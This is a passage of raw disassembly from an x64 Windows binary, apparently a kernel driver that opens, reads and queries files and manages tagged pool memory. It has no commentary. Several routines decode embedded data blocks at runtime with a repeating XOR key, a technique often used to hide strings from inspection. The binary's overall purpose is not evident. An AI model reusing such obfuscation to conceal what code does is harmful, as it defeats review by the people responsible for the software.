   140001741:	ff 15 29 6c 00 00    	call   *0x6c29(%rip)        # 0x140008370
   140001747:	b0 01                	mov    $0x1,%al
   140001749:	4c 8d 9c 24 10 01 00 	lea    0x110(%rsp),%r11
   140001750:	00 
   140001751:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140001755:	4d 8b 73 28          	mov    0x28(%r11),%r14
   140001759:	49 8b e3             	mov    %r11,%rsp
   14000175c:	5d                   	pop    %rbp
   14000175d:	c3                   	ret
   14000175e:	cc                   	int3
   14000175f:	cc                   	int3
   140001760:	48 8b 05 41 2d 01 00 	mov    0x12d41(%rip),%rax        # 0x1400144a8
   140001767:	41 b8 01 00 00 c0    	mov    $0xc0000001,%r8d
   14000176d:	48 8b 0d 84 31 01 00 	mov    0x13184(%rip),%rcx        # 0x1400148f8
   140001774:	48 ff 25 f5 6b 00 00 	rex.W jmp *0x6bf5(%rip)        # 0x140008370
   14000177b:	cc                   	int3
   14000177c:	80 3d ad a0 00 00 00 	cmpb   $0x0,0xa0ad(%rip)        # 0x14000b830
   140001783:	75 03                	jne    0x140001788
   140001785:	33 c0                	xor    %eax,%eax
   140001787:	c3                   	ret
   140001788:	48 8b 15 c1 a0 00 00 	mov    0xa0c1(%rip),%rdx        # 0x14000b850
   14000178f:	48 8b 05 d2 25 01 00 	mov    0x125d2(%rip),%rax        # 0x140013d68
   140001796:	48 8b 0d 5b 31 01 00 	mov    0x1315b(%rip),%rcx        # 0x1400148f8
   14000179d:	48 ff 25 cc 6b 00 00 	rex.W jmp *0x6bcc(%rip)        # 0x140008370
   1400017a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400017a9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400017ae:	57                   	push   %rdi
   1400017af:	48 83 ec 60          	sub    $0x60,%rsp
   1400017b3:	48 8b f2             	mov    %rdx,%rsi
   1400017b6:	49 8b d8             	mov    %r8,%rbx
   1400017b9:	33 d2                	xor    %edx,%edx
   1400017bb:	48 8b f9             	mov    %rcx,%rdi
   1400017be:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400017c3:	44 8d 42 20          	lea    0x20(%rdx),%r8d
   1400017c7:	e8 b4 5c 00 00       	call   0x140007480
   1400017cc:	48 8b 05 3d 28 01 00 	mov    0x1283d(%rip),%rax        # 0x140014010
   1400017d3:	48 8d 0d 6e a0 00 00 	lea    0xa06e(%rip),%rcx        # 0x14000b848
   1400017da:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   1400017e0:	45 33 c9             	xor    %r9d,%r9d
   1400017e3:	83 4c 24 58 01       	orl    $0x1,0x58(%rsp)
   1400017e8:	4c 8b c6             	mov    %rsi,%r8
   1400017eb:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400017f0:	48 8b d7             	mov    %rdi,%rdx
   1400017f3:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400017f8:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   1400017ff:	00 
   140001800:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001805:	48 8b 0d ec 30 01 00 	mov    0x130ec(%rip),%rcx        # 0x1400148f8
   14000180c:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001811:	ff 15 59 6b 00 00    	call   *0x6b59(%rip)        # 0x140008370
   140001817:	48 8b ce             	mov    %rsi,%rcx
   14000181a:	8b d8                	mov    %eax,%ebx
   14000181c:	e8 2b 01 00 00       	call   0x14000194c
   140001821:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140001826:	85 db                	test   %ebx,%ebx
   140001828:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000182d:	0f 99 c0             	setns  %al
   140001830:	48 83 c4 60          	add    $0x60,%rsp
   140001834:	5f                   	pop    %rdi
   140001835:	c3                   	ret
   140001836:	cc                   	int3
   140001837:	cc                   	int3
   140001838:	cc                   	int3
   140001839:	cc                   	int3
   14000183a:	cc                   	int3
   14000183b:	cc                   	int3
   14000183c:	cc                   	int3
   14000183d:	cc                   	int3
   14000183e:	cc                   	int3
   14000183f:	cc                   	int3
   140001840:	c2 00 00             	ret    $0x0
   140001843:	cc                   	int3
   140001844:	cc                   	int3
   140001845:	cc                   	int3
   140001846:	cc                   	int3
   140001847:	cc                   	int3
   140001848:	cc                   	int3
   140001849:	cc                   	int3
   14000184a:	cc                   	int3
   14000184b:	cc                   	int3
   14000184c:	cc                   	int3
   14000184d:	cc                   	int3
   14000184e:	cc                   	int3
   14000184f:	cc                   	int3
   140001850:	48 8b 05 51 2c 01 00 	mov    0x12c51(%rip),%rax        # 0x1400144a8
   140001857:	45 33 c0             	xor    %r8d,%r8d
   14000185a:	48 8b 0d 97 30 01 00 	mov    0x13097(%rip),%rcx        # 0x1400148f8
   140001861:	48 ff 25 08 6b 00 00 	rex.W jmp *0x6b08(%rip)        # 0x140008370
   140001868:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000186d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001872:	57                   	push   %rdi
   140001873:	48 83 ec 20          	sub    $0x20,%rsp
   140001877:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000187d:	40 32 f6             	xor    %sil,%sil
   140001880:	8b da                	mov    %edx,%ebx
   140001882:	48 8b f9             	mov    %rcx,%rdi
   140001885:	48 85 c9             	test   %rcx,%rcx
   140001888:	0f 84 9a 00 00 00    	je     0x140001928
   14000188e:	85 d2                	test   %edx,%edx
   140001890:	0f 84 92 00 00 00    	je     0x140001928
   140001896:	48 8b 15 ab 9f 00 00 	mov    0x9fab(%rip),%rdx        # 0x14000b848
   14000189d:	48 8b 05 74 27 01 00 	mov    0x12774(%rip),%rax        # 0x140014018
   1400018a4:	48 8b 0d 4d 30 01 00 	mov    0x1304d(%rip),%rcx        # 0x1400148f8
   1400018ab:	ff 15 bf 6a 00 00    	call   *0x6abf(%rip)        # 0x140008370
   1400018b1:	48 8b c8             	mov    %rax,%rcx
   1400018b4:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400018b9:	48 8d 15 b0 5c 00 00 	lea    0x5cb0(%rip),%rdx        # 0x140007570
   1400018c0:	e8 cf 39 00 00       	call   0x140005294
   1400018c5:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400018ca:	85 c0                	test   %eax,%eax
   1400018cc:	78 48                	js     0x140001916
   1400018ce:	48 8d 41 0c          	lea    0xc(%rcx),%rax
   1400018d2:	48 85 c0             	test   %rax,%rax
   1400018d5:	74 3f                	je     0x140001916
   1400018d7:	8b 41 08             	mov    0x8(%rcx),%eax
   1400018da:	85 c0                	test   %eax,%eax
   1400018dc:	74 38                	je     0x140001916
   1400018de:	3b d8                	cmp    %eax,%ebx
   1400018e0:	76 34                	jbe    0x140001916
   1400018e2:	44 8b c3             	mov    %ebx,%r8d
   1400018e5:	33 d2                	xor    %edx,%edx
   1400018e7:	48 8b cf             	mov    %rdi,%rcx
   1400018ea:	e8 91 5b 00 00       	call   0x140007480
   1400018ef:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400018f4:	8b 48 08             	mov    0x8(%rax),%ecx
   1400018f7:	48 8d 50 0c          	lea    0xc(%rax),%rdx
   1400018fb:	3b d9                	cmp    %ecx,%ebx
   1400018fd:	8d 43 ff             	lea    -0x1(%rbx),%eax
   140001900:	0f 46 c8             	cmovbe %eax,%ecx
   140001903:	44 8b c1             	mov    %ecx,%r8d
   140001906:	48 8b cf             	mov    %rdi,%rcx
   140001909:	e8 b2 58 00 00       	call   0x1400071c0
   14000190e:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001913:	40 b6 01             	mov    $0x1,%sil
   140001916:	48 85 c9             	test   %rcx,%rcx
   140001919:	74 08                	je     0x140001923
   14000191b:	33 d2                	xor    %edx,%edx
   14000191d:	ff 15 1d 6a 00 00    	call   *0x6a1d(%rip)        # 0x140008340
   140001923:	40 8a c6             	mov    %sil,%al
   140001926:	eb 02                	jmp    0x14000192a
   140001928:	32 c0                	xor    %al,%al
   14000192a:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000192f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140001934:	48 83 c4 20          	add    $0x20,%rsp
   140001938:	5f                   	pop    %rdi
   140001939:	c3                   	ret
   14000193a:	cc                   	int3
   14000193b:	cc                   	int3
   14000193c:	48 89 0d f5 9e 00 00 	mov    %rcx,0x9ef5(%rip)        # 0x14000b838
   140001943:	48 89 15 f6 9e 00 00 	mov    %rdx,0x9ef6(%rip)        # 0x14000b840
   14000194a:	c3                   	ret
   14000194b:	cc                   	int3
   14000194c:	48 83 ec 38          	sub    $0x38,%rsp
   140001950:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001954:	4c 8d 0d a5 76 00 00 	lea    0x76a5(%rip),%r9        # 0x140009000
   14000195b:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001961:	48 8d 15 b0 6a 00 00 	lea    0x6ab0(%rip),%rdx        # 0x140008418
   140001968:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000196d:	e8 1e 3a 00 00       	call   0x140005390
   140001972:	48 83 c4 38          	add    $0x38,%rsp
   140001976:	c3                   	ret
   140001977:	cc                   	int3
   140001978:	40 57                	rex push %rdi
   14000197a:	48 83 ec 20          	sub    $0x20,%rsp
   14000197e:	48 8d 3d 8b 9d 00 00 	lea    0x9d8b(%rip),%rdi        # 0x14000b710
   140001985:	ba 7f 00 00 00       	mov    $0x7f,%edx
   14000198a:	4c 8b c7             	mov    %rdi,%r8
   14000198d:	48 8d 0d 7c 76 00 00 	lea    0x767c(%rip),%rcx        # 0x140009010
   140001994:	e8 f7 00 00 00       	call   0x140001a90
   140001999:	4c 8b c7             	mov    %rdi,%r8
   14000199c:	48 8d 0d ed 76 00 00 	lea    0x76ed(%rip),%rcx        # 0x140009090
   1400019a3:	ba 7f 00 00 00       	mov    $0x7f,%edx
   1400019a8:	e8 e3 00 00 00       	call   0x140001a90
   1400019ad:	4c 8b c7             	mov    %rdi,%r8
   1400019b0:	48 8d 0d 59 77 00 00 	lea    0x7759(%rip),%rcx        # 0x140009110
   1400019b7:	ba 7f 00 00 00       	mov    $0x7f,%edx
   1400019bc:	e8 cf 00 00 00       	call   0x140001a90
   1400019c1:	4c 8b c7             	mov    %rdi,%r8
   1400019c4:	48 8d 0d c5 77 00 00 	lea    0x77c5(%rip),%rcx        # 0x140009190
   1400019cb:	ba 7f 00 00 00       	mov    $0x7f,%edx
   1400019d0:	e8 bb 00 00 00       	call   0x140001a90
   1400019d5:	4c 8b c7             	mov    %rdi,%r8
   1400019d8:	48 8d 0d 31 78 00 00 	lea    0x7831(%rip),%rcx        # 0x140009210
   1400019df:	ba 9d 00 00 00       	mov    $0x9d,%edx
   1400019e4:	e8 a7 00 00 00       	call   0x140001a90
   1400019e9:	4c 8b c7             	mov    %rdi,%r8
   1400019ec:	48 8d 0d bd 78 00 00 	lea    0x78bd(%rip),%rcx        # 0x1400092b0
   1400019f3:	ba 4a 00 00 00       	mov    $0x4a,%edx
   1400019f8:	e8 93 00 00 00       	call   0x140001a90
   1400019fd:	4c 8b c7             	mov    %rdi,%r8
   140001a00:	48 8d 0d f9 78 00 00 	lea    0x78f9(%rip),%rcx        # 0x140009300
   140001a07:	ba 0c 00 00 00       	mov    $0xc,%edx
   140001a0c:	48 83 c4 20          	add    $0x20,%rsp
   140001a10:	5f                   	pop    %rdi
   140001a11:	e9 7a 00 00 00       	jmp    0x140001a90
   140001a16:	cc                   	int3
   140001a17:	cc                   	int3
   140001a18:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001a1d:	4c 8d 05 ec 78 00 00 	lea    0x78ec(%rip),%r8        # 0x140009310
   140001a24:	33 db                	xor    %ebx,%ebx
   140001a26:	44 8b db             	mov    %ebx,%r11d
   140001a29:	4d 8b c8             	mov    %r8,%r9
   140001a2c:	45 0f b7 11          	movzwl (%r9),%r10d
   140001a30:	66 45 85 d2          	test   %r10w,%r10w
   140001a34:	74 3f                	je     0x140001a75
   140001a36:	41 8b cb             	mov    %r11d,%ecx
   140001a39:	b8 25 49 92 24       	mov    $0x24924925,%eax
   140001a3e:	41 f7 e3             	mul    %r11d
   140001a41:	41 8b c3             	mov    %r11d,%eax
   140001a44:	41 ff c3             	inc    %r11d
   140001a47:	2b c2                	sub    %edx,%eax
   140001a49:	d1 e8                	shr    $1,%eax
   140001a4b:	03 c2                	add    %edx,%eax
   140001a4d:	c1 e8 02             	shr    $0x2,%eax
   140001a50:	6b c0 07             	imul   $0x7,%eax,%eax
   140001a53:	2b c8                	sub    %eax,%ecx
   140001a55:	48 63 c1             	movslq %ecx,%rax
   140001a58:	48 8d 0d b1 9c 00 00 	lea    0x9cb1(%rip),%rcx        # 0x14000b710
   140001a5f:	66 44 33 14 81       	xor    (%rcx,%rax,4),%r10w
   140001a64:	66 45 89 11          	mov    %r10w,(%r9)
   140001a68:	49 83 c1 02          	add    $0x2,%r9
   140001a6c:	41 81 fb 00 04 00 00 	cmp    $0x400,%r11d
   140001a73:	7c b7                	jl     0x140001a2c
   140001a75:	49 81 c0 00 04 00 00 	add    $0x400,%r8
   140001a7c:	48 8d 05 8d 9c 00 00 	lea    0x9c8d(%rip),%rax        # 0x14000b710
   140001a83:	4c 3b c0             	cmp    %rax,%r8
   140001a86:	7c 9e                	jl     0x140001a26
   140001a88:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140001a8d:	c3                   	ret
   140001a8e:	cc                   	int3
   140001a8f:	cc                   	int3
   140001a90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001a95:	45 33 d2             	xor    %r10d,%r10d
   140001a98:	49 8b d8             	mov    %r8,%rbx
   140001a9b:	44 8b da             	mov    %edx,%r11d
   140001a9e:	4c 8b c9             	mov    %rcx,%r9
   140001aa1:	85 d2                	test   %edx,%edx
   140001aa3:	7e 39                	jle    0x140001ade
   140001aa5:	45 8a 01             	mov    (%r9),%r8b
   140001aa8:	45 84 c0             	test   %r8b,%r8b
   140001aab:	74 31                	je     0x140001ade
   140001aad:	b8 25 49 92 24       	mov    $0x24924925,%eax
   140001ab2:	41 8b ca             	mov    %r10d,%ecx
   140001ab5:	41 f7 e2             	mul    %r10d
   140001ab8:	41 8b c2             	mov    %r10d,%eax
   140001abb:	41 ff c2             	inc    %r10d
   140001abe:	2b c2                	sub    %edx,%eax
   140001ac0:	d1 e8                	shr    $1,%eax
   140001ac2:	03 c2                	add    %edx,%eax
   140001ac4:	c1 e8 02             	shr    $0x2,%eax
   140001ac7:	6b c0 07             	imul   $0x7,%eax,%eax
   140001aca:	2b c8                	sub    %eax,%ecx
   140001acc:	48 63 c1             	movslq %ecx,%rax
   140001acf:	44 32 04 83          	xor    (%rbx,%rax,4),%r8b
   140001ad3:	45 88 01             	mov    %r8b,(%r9)
   140001ad6:	49 ff c1             	inc    %r9
   140001ad9:	45 3b d3             	cmp    %r11d,%r10d
   140001adc:	7c c7                	jl     0x140001aa5
   140001ade:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140001ae3:	c3                   	ret
   140001ae4:	83 f9 04             	cmp    $0x4,%ecx
   140001ae7:	75 08                	jne    0x140001af1
   140001ae9:	48 8d 05 20 77 00 00 	lea    0x7720(%rip),%rax        # 0x140009210
   140001af0:	c3                   	ret
   140001af1:	83 f9 05             	cmp    $0x5,%ecx
   140001af4:	75 08                	jne    0x140001afe
   140001af6:	48 8d 05 b3 77 00 00 	lea    0x77b3(%rip),%rax        # 0x1400092b0
   140001afd:	c3                   	ret
   140001afe:	83 f9 06             	cmp    $0x6,%ecx
   140001b01:	75 08                	jne    0x140001b0b
   140001b03:	48 8d 05 f6 77 00 00 	lea    0x77f6(%rip),%rax        # 0x140009300
   140001b0a:	c3                   	ret
   140001b0b:	48 63 c1             	movslq %ecx,%rax
   140001b0e:	48 8d 0d fb 74 00 00 	lea    0x74fb(%rip),%rcx        # 0x140009010
   140001b15:	48 c1 e0 07          	shl    $0x7,%rax
   140001b19:	48 03 c1             	add    %rcx,%rax
   140001b1c:	c3                   	ret
   140001b1d:	cc                   	int3
   140001b1e:	cc                   	int3
   140001b1f:	cc                   	int3
   140001b20:	48 63 c1             	movslq %ecx,%rax
   140001b23:	48 8d 0d e6 77 00 00 	lea    0x77e6(%rip),%rcx        # 0x140009310
   140001b2a:	48 c1 e0 0a          	shl    $0xa,%rax
   140001b2e:	48 03 c1             	add    %rcx,%rax
   140001b31:	c3                   	ret
   140001b32:	cc                   	int3
   140001b33:	cc                   	int3
   140001b34:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001b39:	57                   	push   %rdi
   140001b3a:	48 83 ec 20          	sub    $0x20,%rsp
   140001b3e:	ba 80 00 10 00       	mov    $0x100080,%edx
   140001b43:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001b49:	bb 34 00 00 c0       	mov    $0xc0000034,%ebx
   140001b4e:	e8 1d 01 00 00       	call   0x140001c70
   140001b53:	48 8b f8             	mov    %rax,%rdi
   140001b56:	48 85 c0             	test   %rax,%rax
   140001b59:	74 13                	je     0x140001b6e
   140001b5b:	48 8b c8             	mov    %rax,%rcx
   140001b5e:	e8 a1 04 00 00       	call   0x140002004
   140001b63:	48 8b cf             	mov    %rdi,%rcx
   140001b66:	8b d8                	mov    %eax,%ebx
   140001b68:	ff 15 ba 65 00 00    	call   *0x65ba(%rip)        # 0x140008128
   140001b6e:	8b c3                	mov    %ebx,%eax
   140001b70:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001b75:	48 83 c4 20          	add    $0x20,%rsp
   140001b79:	5f                   	pop    %rdi
   140001b7a:	c3                   	ret
   140001b7b:	cc                   	int3
   140001b7c:	40 55                	rex push %rbp
   140001b7e:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   140001b83:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   140001b8a:	48 8b 05 1f 9c 00 00 	mov    0x9c1f(%rip),%rax        # 0x14000b7b0
   140001b91:	48 33 c4             	xor    %rsp,%rax
   140001b94:	48 89 45 47          	mov    %rax,0x47(%rbp)
   140001b98:	48 83 65 d7 00       	andq   $0x0,-0x29(%rbp)
   140001b9d:	4c 8d 4d df          	lea    -0x21(%rbp),%r9
   140001ba1:	c7 44 24 68 00 01 00 	movl   $0x100,0x68(%rsp)
   140001ba8:	00 
   140001ba9:	33 c0                	xor    %eax,%eax
   140001bab:	48 21 44 24 60       	and    %rax,0x60(%rsp)
   140001bb0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001bb3:	21 44 24 58          	and    %eax,0x58(%rsp)
   140001bb7:	21 44 24 50          	and    %eax,0x50(%rsp)
   140001bbb:	48 21 44 24 48       	and    %rax,0x48(%rsp)
   140001bc0:	48 21 45 f7          	and    %rax,-0x9(%rbp)
   140001bc4:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   140001bcb:	00 
   140001bcc:	c7 44 24 38 02 00 00 	movl   $0x2,0x38(%rsp)
   140001bd3:	00 
   140001bd4:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   140001bd9:	4c 8d 45 ef          	lea    -0x11(%rbp),%r8
   140001bdd:	48 89 4d ff          	mov    %rcx,-0x1(%rbp)
   140001be1:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140001be5:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140001bec:	00 
   140001bed:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   140001bf2:	0f 11 45 1f          	movups %xmm0,0x1f(%rbp)
   140001bf6:	48 89 45 3f          	mov    %rax,0x3f(%rbp)
   140001bfa:	0f 11 45 2f          	movups %xmm0,0x2f(%rbp)
   140001bfe:	c7 45 ef 30 00 00 00 	movl   $0x30,-0x11(%rbp)
   140001c05:	c7 45 07 40 02 00 00 	movl   $0x240,0x7(%rbp)
   140001c0c:	f3 0f 7f 45 0f       	movdqu %xmm0,0xf(%rbp)
   140001c11:	ff 15 c9 64 00 00    	call   *0x64c9(%rip)        # 0x1400080e0
   140001c17:	85 c0                	test   %eax,%eax
   140001c19:	79 04                	jns    0x140001c1f
   140001c1b:	33 c0                	xor    %eax,%eax
   140001c1d:	eb 3a                	jmp    0x140001c59
   140001c1f:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140001c23:	4c 8d 45 1f          	lea    0x1f(%rbp),%r8
   140001c27:	41 b9 28 00 00 00    	mov    $0x28,%r9d
   140001c2d:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140001c34:	00 
   140001c35:	48 8d 55 df          	lea    -0x21(%rbp),%rdx
   140001c39:	ff 15 c9 64 00 00    	call   *0x64c9(%rip)        # 0x140008108
   140001c3f:	85 c0                	test   %eax,%eax
   140001c41:	79 0c                	jns    0x140001c4f
   140001c43:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140001c47:	ff 15 db 64 00 00    	call   *0x64db(%rip)        # 0x140008128
   140001c4d:	eb cc                	jmp    0x140001c1b
   140001c4f:	f6 45 3f 10          	testb  $0x10,0x3f(%rbp)
   140001c53:	75 ee                	jne    0x140001c43
   140001c55:	48 8b 45 d7          	mov    -0x29(%rbp),%rax
   140001c59:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   140001c5d:	48 33 cc             	xor    %rsp,%rcx
   140001c60:	e8 4b 54 00 00       	call   0x1400070b0
   140001c65:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   140001c6c:	5d                   	pop    %rbp
   140001c6d:	c3                   	ret
   140001c6e:	cc                   	int3
   140001c6f:	cc                   	int3
   140001c70:	40 55                	rex push %rbp
   140001c72:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   140001c77:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   140001c7e:	48 8b 05 2b 9b 00 00 	mov    0x9b2b(%rip),%rax        # 0x14000b7b0
   140001c85:	48 33 c4             	xor    %rsp,%rax
   140001c88:	48 89 45 47          	mov    %rax,0x47(%rbp)
   140001c8c:	48 83 65 d7 00       	andq   $0x0,-0x29(%rbp)
   140001c91:	4c 8d 4d df          	lea    -0x21(%rbp),%r9
   140001c95:	c7 44 24 68 00 01 00 	movl   $0x100,0x68(%rsp)
   140001c9c:	00 
   140001c9d:	33 c0                	xor    %eax,%eax
   140001c9f:	48 21 44 24 60       	and    %rax,0x60(%rsp)
   140001ca4:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001ca7:	21 44 24 58          	and    %eax,0x58(%rsp)
   140001cab:	21 44 24 50          	and    %eax,0x50(%rsp)
   140001caf:	48 21 44 24 48       	and    %rax,0x48(%rsp)
   140001cb4:	48 21 45 f7          	and    %rax,-0x9(%rbp)
   140001cb8:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   140001cbf:	00 
   140001cc0:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140001cc7:	00 
   140001cc8:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   140001ccd:	4c 8d 45 ef          	lea    -0x11(%rbp),%r8
   140001cd1:	48 89 4d ff          	mov    %rcx,-0x1(%rbp)
   140001cd5:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140001cd9:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140001ce0:	00 
   140001ce1:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   140001ce6:	0f 11 45 1f          	movups %xmm0,0x1f(%rbp)
   140001cea:	48 89 45 3f          	mov    %rax,0x3f(%rbp)
   140001cee:	0f 11 45 2f          	movups %xmm0,0x2f(%rbp)
   140001cf2:	c7 45 ef 30 00 00 00 	movl   $0x30,-0x11(%rbp)
   140001cf9:	c7 45 07 40 02 00 00 	movl   $0x240,0x7(%rbp)
   140001d00:	f3 0f 7f 45 0f       	movdqu %xmm0,0xf(%rbp)
   140001d05:	ff 15 d5 63 00 00    	call   *0x63d5(%rip)        # 0x1400080e0
   140001d0b:	85 c0                	test   %eax,%eax
   140001d0d:	79 04                	jns    0x140001d13
   140001d0f:	33 c0                	xor    %eax,%eax
   140001d11:	eb 3a                	jmp    0x140001d4d
   140001d13:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140001d17:	4c 8d 45 1f          	lea    0x1f(%rbp),%r8
   140001d1b:	41 b9 28 00 00 00    	mov    $0x28,%r9d
   140001d21:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140001d28:	00 
   140001d29:	48 8d 55 df          	lea    -0x21(%rbp),%rdx
   140001d2d:	ff 15 d5 63 00 00    	call   *0x63d5(%rip)        # 0x140008108
   140001d33:	85 c0                	test   %eax,%eax
   140001d35:	79 0c                	jns    0x140001d43
   140001d37:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   140001d3b:	ff 15 e7 63 00 00    	call   *0x63e7(%rip)        # 0x140008128
   140001d41:	eb cc                	jmp    0x140001d0f
   140001d43:	f6 45 3f 10          	testb  $0x10,0x3f(%rbp)
   140001d47:	75 ee                	jne    0x140001d37
   140001d49:	48 8b 45 d7          	mov    -0x29(%rbp),%rax
   140001d4d:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   140001d51:	48 33 cc             	xor    %rsp,%rcx
   140001d54:	e8 57 53 00 00       	call   0x1400070b0
   140001d59:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   140001d60:	5d                   	pop    %rbp
   140001d61:	c3                   	ret
   140001d62:	cc                   	int3
   140001d63:	cc                   	int3
   140001d64:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001d69:	56                   	push   %rsi
   140001d6a:	57                   	push   %rdi
   140001d6b:	41 56                	push   %r14
   140001d6d:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140001d74:	48 8b 05 35 9a 00 00 	mov    0x9a35(%rip),%rax        # 0x14000b7b0
   140001d7b:	48 33 c4             	xor    %rsp,%rax
   140001d7e:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140001d83:	49 8b f0             	mov    %r8,%rsi
   140001d86:	4c 8b f2             	mov    %rdx,%r14
   140001d89:	ba 80 00 10 00       	mov    $0x100080,%edx
   140001d8e:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001d94:	bb 01 00 00 c0       	mov    $0xc0000001,%ebx
   140001d99:	e8 d2 fe ff ff       	call   0x140001c70
   140001d9e:	48 8b f8             	mov    %rax,%rdi
   140001da1:	48 85 c0             	test   %rax,%rax
   140001da4:	0f 84 9b 00 00 00    	je     0x140001e45
   140001daa:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   140001db0:	c7 44 24 20 05 00 00 	movl   $0x5,0x20(%rsp)
   140001db7:	00 
   140001db8:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140001dbd:	48 8b c8             	mov    %rax,%rcx
   140001dc0:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140001dc5:	ff 15 3d 63 00 00    	call   *0x633d(%rip)        # 0x140008108
   140001dcb:	8b d8                	mov    %eax,%ebx
   140001dcd:	85 c0                	test   %eax,%eax
   140001dcf:	78 6b                	js     0x140001e3c
   140001dd1:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140001dd6:	41 b8 51 61 78 58    	mov    $0x58786151,%r8d
   140001ddc:	89 0e                	mov    %ecx,(%rsi)
   140001dde:	8b d1                	mov    %ecx,%edx
   140001de0:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001de5:	ff 15 1d 65 00 00    	call   *0x651d(%rip)        # 0x140008308
   140001deb:	49 89 06             	mov    %rax,(%r14)
   140001dee:	48 85 c0             	test   %rax,%rax
   140001df1:	74 49                	je     0x140001e3c
   140001df3:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140001df9:	45 33 c9             	xor    %r9d,%r9d
   140001dfc:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140001e02:	45 33 c0             	xor    %r8d,%r8d
   140001e05:	8b 0e                	mov    (%rsi),%ecx
   140001e07:	33 d2                	xor    %edx,%edx
   140001e09:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   140001e0d:	48 8b cf             	mov    %rdi,%rcx
   140001e10:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001e15:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140001e1a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001e1f:	ff 15 f3 62 00 00    	call   *0x62f3(%rip)        # 0x140008118
   140001e25:	8b d8                	mov    %eax,%ebx
   140001e27:	85 c0                	test   %eax,%eax
   140001e29:	79 11                	jns    0x140001e3c
   140001e2b:	83 26 00             	andl   $0x0,(%rsi)
   140001e2e:	ba 51 61 78 58       	mov    $0x58786151,%edx
   140001e33:	49 8b 0e             	mov    (%r14),%rcx
   140001e36:	ff 15 04 65 00 00    	call   *0x6504(%rip)        # 0x140008340
   140001e3c:	48 8b cf             	mov    %rdi,%rcx
   140001e3f:	ff 15 e3 62 00 00    	call   *0x62e3(%rip)        # 0x140008128
   140001e45:	8b c3                	mov    %ebx,%eax
   140001e47:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140001e4c:	48 33 cc             	xor    %rsp,%rcx
   140001e4f:	e8 5c 52 00 00       	call   0x1400070b0
   140001e54:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   140001e5b:	00 
   140001e5c:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140001e63:	41 5e                	pop    %r14
   140001e65:	5f                   	pop    %rdi
